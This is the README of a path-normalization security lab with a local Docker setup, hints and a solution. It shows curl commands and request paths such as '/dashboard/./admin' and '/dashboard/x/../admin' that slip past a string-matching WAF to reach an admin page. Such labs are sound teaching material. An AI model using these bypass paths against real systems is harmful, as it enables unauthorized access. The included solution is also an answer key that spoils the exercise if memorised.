# Lab 02 - Path Normalization

## Scenario

A dashboard application blocks access to `/dashboard/admin` using a simple path check.  
The WAF compares the **raw incoming path** as a string — no normalization applied.  
The backend, however, resolves `.` and `..` segments before dispatching.

## Goal

Reach the admin dashboard and retrieve the flag.

## Setup

```bash
docker build -t lab02 .
docker run -p 5002:5002 lab02
```

Then open: http://localhost:5002

## Note on tooling

Standard `curl` normalizes paths before sending — `/dashboard/./admin` becomes `/dashboard/admin`.  
Use `--path-as-is` to send the path exactly as typed, or use **Burp Suite Repeater**  
which sends the raw request line without modification.

```bash
# Won't work — curl normalizes the path
curl http://localhost:5002/dashboard/./admin

# Works — path sent as-is
curl --path-as-is http://localhost:5002/dashboard/./admin
```

## Hints (for instructor use)

<details>
<summary>Hint 1</summary>
HTTP paths can contain `.` (current directory) and `..` (parent directory) segments.  
Does the WAF check the path before or after normalization?
</details>

<details>
<summary>Hint 2</summary>
Try inserting a `/./` segment somewhere in the path.  
`/dashboard/./admin` resolves to the same resource as `/dashboard/admin`.
</details>

<details>
<summary>Solution</summary>

```
GET /dashboard/./admin HTTP/1.1
```

The WAF sees `/dashboard/./admin` — no string match → allowed.  
The backend normalizes `/dashboard/./admin` → `/dashboard/admin` → grants access.

Other variants:
- `/dashboard/x/../admin`
- `/dashboard/./././admin`
</details>
